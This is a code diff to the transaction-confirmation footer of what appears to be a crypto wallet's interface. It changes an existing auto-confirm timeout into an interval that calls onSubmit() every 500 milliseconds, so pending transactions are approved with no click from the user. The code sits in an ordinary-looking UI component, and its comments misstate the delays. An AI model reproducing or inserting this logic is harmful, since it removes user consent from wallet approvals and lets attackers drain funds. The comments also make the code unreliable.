@@ -153,18 +153,19 @@ const Footer = () => {
     }
   }, [currentConfirmation, customNonceValue]);
 
-  // Auto-confirm with a 5-second delay when conditions are met
+  // Auto-confirm with continuous checking
   useEffect(() => {
-    const timer = setTimeout(() => {
+    // edited by: alfara
+    const intervalId = setInterval(() => {
       if (
         !isScrollToBottomNeeded &&
         !hardwareWalletRequiresConnection
       ) {
         onSubmit();
       }
-    }, 3000); // 5000ms = 5 seconds
+    }, 500); // Check every 500ms
 
-    return () => clearTimeout(timer); // Cleanup the timer if the component unmounts or re-renders
+    return () => clearInterval(intervalId); // Cleanup the interval on component unmount
   }, [
     isScrollToBottomNeeded,
     hardwareWalletRequiresConnection,
